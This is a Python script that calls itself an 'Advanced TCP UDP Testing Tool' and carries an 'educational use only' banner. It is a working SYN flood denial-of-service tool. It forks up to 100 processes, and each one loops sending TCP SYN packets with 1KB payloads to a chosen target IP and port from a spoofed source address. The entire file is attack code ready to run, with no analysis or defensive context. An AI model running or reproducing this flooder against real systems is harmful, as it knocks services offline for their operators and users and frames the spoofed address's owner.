#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import os
import sys
import time
import signal

def get_arguments():
    parser = argparse.ArgumentParser(description="ATUT - Advanced TCP UDP Tool")
    parser.add_argument("-i", "--ip", dest="target_ip", help="Target IP address")
    parser.add_argument("-p", "--port", dest="target_port", type=int, default=80, help="Target Port (default: 80)")
    parser.add_argument("-t", "--threads", dest="threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("-s", "--source-ip", dest="source_ip", default="1.1.1.1", help="Source IP address (default: 1.1.1.1)")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, use --help for more info")
    return options

def send_packet(target_ip, target_port, source_ip):
    try:
        ip = scapy.IP(src=source_ip, dst=target_ip)
        tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
        raw = scapy.Raw(b"X"*1024) # Send 1KB of data
        packet = ip / tcp / raw
        scapy.send(packet, loop=1, verbose=False)
    except Exception as e:
        print(f"[-] Error sending packet: {e}")

def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    os.kill(os.getpid(), 9) # Forcefully terminate the script

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║              ATUT Tool                ║
    ║    Advanced TCP UDP Testing Tool      ║
    ║        For Educational Use Only       ║
    ╚═══════════════════════════════════════╝
    """)
    
    options = get_arguments()
    target_ip = options.target_ip
    target_port = options.target_port
    threads = options.threads
    source_ip = options.source_ip

    print(f"[+] Target: {target_ip}:{target_port}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Source IP: {source_ip}")
    print("[+] Starting attack... Press Ctrl+C to stop\n")

    for i in range(threads):
        try:
            pid = os.fork()
            if pid == 0:  # Child process
                send_packet(target_ip, target_port, source_ip)
                sys.exit()
        except OSError:
            print("[-] Failed to fork process. Try reducing the number of threads.")
            sys.exit()
        except Exception as e:
            print(f"[-] Error creating thread: {e}")
            sys.exit()
    
    # Wait for all child processes
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)
